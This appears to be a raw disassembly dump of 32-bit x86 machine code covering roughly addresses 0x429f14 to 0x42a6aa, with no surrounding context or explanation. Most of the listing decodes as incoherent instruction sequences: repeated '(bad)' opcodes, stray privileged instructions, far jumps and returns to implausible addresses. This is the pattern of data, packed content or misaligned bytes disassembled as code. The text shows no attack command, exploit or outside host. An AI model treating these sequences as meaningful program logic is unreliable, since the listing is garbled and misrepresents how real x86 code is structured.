  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
